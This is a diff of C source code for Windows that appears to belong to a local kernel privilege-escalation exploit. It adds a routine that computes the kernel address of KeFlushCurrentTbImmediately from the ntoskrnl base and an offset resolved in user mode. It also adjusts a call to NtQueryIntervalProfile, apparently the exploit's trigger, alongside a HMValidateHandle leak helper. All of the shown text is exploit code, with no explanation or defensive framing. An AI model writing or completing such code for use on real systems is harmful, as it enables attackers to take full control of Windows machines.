@@ -108,6 +108,41 @@ exit:
 	return ulRes;
 }
 
+QWORD GetKeFlushCurrentTbImmediately()
+{
+	QWORD qwRet = 0;
+
+	QWORD qwOSBase = 0;
+
+	qwOSBase = GetNTBase();
+	if (qwOSBase == 0)
+	{
+		goto exit;
+	}
+
+	HMODULE hModel = NULL;
+
+	hModel = LoadLibrary("ntoskrnl.exe");
+	if (!hModel)
+	{
+		ShowError("LoadLibrary", GetLastError());
+		goto exit;
+	}
+
+	QWORD qwAddress = 0;
+	qwAddress = (QWORD)GetProcAddress(hModel, "KeFlushCurrentTbImmediately");
+	if (!qwAddress)
+	{
+		ShowError("GetProcAddress", GetLastError());
+		goto exit;
+	}
+
+	qwRet = qwAddress - (QWORD)hModel + qwOSBase;
+
+exit:
+	return qwRet;
+}
+
 PVOID GetHMValidateHandle()
 {
 	PVOID pFuncAddr = NULL;
@@ -204,8 +239,8 @@ BOOL CallNtQueryIntervalProfile()
 		goto exit;
 	}
 
-	DWORD dwRet = 0;
-	DWORD dwProfileTotalIssues = 0x3;
+	QWORD dwRet = 0;
+	QWORD dwProfileTotalIssues = 0x3;
 	status = NtQueryIntervalProfile(dwProfileTotalIssues, &dwRet);
 	if (status < 0)
 	{
